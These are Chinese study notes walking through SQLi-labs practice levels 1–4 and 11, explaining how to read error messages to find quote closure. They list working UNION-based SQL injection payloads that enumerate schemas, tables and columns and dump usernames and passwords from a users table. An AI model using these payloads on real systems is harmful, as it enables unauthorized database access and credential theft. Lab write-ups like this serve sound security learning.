# 三、答题模式-基础知识-Less1~4

### Less-1
sql的报错会用单引号括起来，在看报错的时候注意先提取出报错的sql语句，再进行判断<br>
根据result.txt的结果，猜#被过滤，以后可以尝试--+

UNION的功能可以猜出表的列数，如：`union select 1,2--+`<br>
当数据不存在时候联查出构造的union数据。
> 注意：union all允许重复值。

- 得到数据库名<br>
 `'or 1=2 union select 1,database()--+`
- 得到所有数据库名：<br>
`?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+`
- 得到security数据库的所有表名:<br>
`?id=-1'  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+`
- 得到users表列属性<br>
`?id=-1'  union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+`
- 得到security数据库users表的列属性<br>
`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+`
- 爆数据
`?id=-1' union select 1,username,password from users --+`

### Less-2
sql查询也可能会使用整型where语句，因此也会直接--+得到结果<br>
整型后注释即可：<br>
`?id=1--+`<br>
`?id=1 or 1=1 --+`

### Less-3
直接`?id=1'`会报错：`near ''1'') LIMIT 0,1' at line 1`<br>
这意味着：`Select login_name, select password from table where id= ('our input here')`<br> 
因此可得`1'`后的是单引号且已闭合，缺少语句是`)`，补充语句后即可：`?id=1')--+`

### Less-4
与Less-3差不多一致，是单引号与双引号的区别而已<br>
使用`?id=1") union select 1,2,3--+`即可构造注入

### Less-11
使用网络监控得到post请求的数据，然后在hackbar构造post请求即可

